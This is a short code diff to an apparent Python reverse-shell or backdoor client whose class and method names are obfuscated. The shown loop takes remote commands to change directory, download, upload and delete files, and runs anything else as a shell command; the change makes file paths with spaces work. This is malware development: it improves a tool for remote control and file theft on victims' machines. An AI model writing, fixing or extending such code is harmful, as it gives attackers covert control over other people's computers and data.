@@ -54,13 +54,13 @@ class dtf2un:
                         self.sp.close()
                         break
                     elif command[0] == "cd" and len(command) > 1:
-                        result = self.fz2v9t(command[1])
+                        result = self.fz2v9t(" ".join(command[1:]))
                     elif command[0] == "download":
-                        result = self.qzwu9g(command[1])
+                        result = self.qzwu9g(" ".join(command[1:]))
                     elif command[0] == "upload":
                         result = self._73mvhb(command[1], command[2].encode())
                     elif command[0] == "delete":
-                        result = self.x98skil(command[1])
+                        result = self.x98skil(" ".join(command[1:]))
                     else:
                         result = self._5zxun5(command).decode()
                 except Exception as e:
